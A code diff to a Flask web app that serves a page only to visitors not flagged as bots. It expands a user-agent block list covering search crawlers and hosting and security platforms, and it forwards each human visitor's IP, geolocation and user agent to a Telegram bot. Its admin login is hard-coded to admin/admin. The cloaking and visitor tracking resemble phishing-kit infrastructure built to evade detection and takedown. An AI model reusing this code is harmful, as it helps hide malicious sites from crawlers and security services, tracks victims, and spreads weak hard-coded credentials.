@@ -66,8 +66,13 @@ def token_required(f):
 @app.route("/api/admin/login", methods=["POST"])
 def login():
     data = request.get_json()
-    if data["username"] == "admin" and data["password"] == "admin":
-        token = jwt.encode({"user": data["username"]}, SECRET_KEY, algorithm="HS256")
+    username = data.get("username")
+    password = data.get("password")
+
+    if username == "admin" and password == "admin":
+        token = jwt.encode({"user": username}, SECRET_KEY, algorithm="HS256").decode(
+            "utf-8"
+        )
         return jsonify({"success": True, "token": token})
     return jsonify({"success": False, "message": "Invalid credentials"}), 401
 
@@ -121,7 +126,7 @@ def index():
     if ip == "127.0.0.1":
         return render_template(INDEX_TEMPLATE)
     if is_bot(ip, user_agent):
-        return render_template({"message": "Access Denied"}), 403
+        return jsonify({"message": "Access Denied"}), 403
 
     send_visitor_info(ip, user_agent)
     return render_template(INDEX_TEMPLATE)
@@ -150,11 +155,31 @@ def catch_all(path):
 
 
 def is_bot(ip, user_agent):
+    ip = ip.strip().replace("/", "").replace("\\", "").strip()
     if ip == "127.0.0.1":
         return True
     blocked_organizations = [
         "facebook",
         "netlify",
+        "cloudflare",
+        "vercel",
+        "github",
+        "gitlab",
+        "bitbucket",
+        "heroku",
+        "aws",
+        "azure",
+        "digitalocean",
+        "lighttpd",
+        "applebot",
+        "googlebot",
+        "bingbot",
+        "yandexbot",
+        "baidu",
+        "duckduckbot",
+        "pinterest",
+        "linkedin",
+        "twitter",
     ]
     if any(org in user_agent.lower() for org in blocked_organizations):
         return True
@@ -172,6 +197,7 @@ def is_bot(ip, user_agent):
 
 
 def send_visitor_info(ip, user_agent):
+    ip = ip.strip().replace("/", "").replace("\\", "").strip()
     try:
         response = requests.get(f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
         geo_data = response.json()
@@ -216,18 +242,22 @@ def send_visitor_info(ip, user_agent):
 
 def send_to_telegram(message, parse_mode="HTML"):
     with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
-        telegram_bot_token = json.load(config_file)["telegram"]["notification_token"]
+        config = json.load(config_file)  # Load config once
+        telegram_bot_token = config["telegram"]["notification_token"]
+        chat_id = config["telegram"]["notification_chatid"]
+
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
     params = {
-        "chat_id": json.load(open(CONFIG_FILE, encoding="utf-8"))["telegram"][
-            "notification_chatid"
-        ],
+        "chat_id": chat_id,
         "text": message,
         "parse_mode": parse_mode,
     }
     try:
         response = requests.post(url, json=params, timeout=5)
-        print(response.json())
+        if response.status_code != 200:
+            print(f"Failed to send message to Telegram: {response.text}")
+        else:
+            print(response.json())
     except RequestException as e:
         print(f"Failed to send message to Telegram: {e}")
 
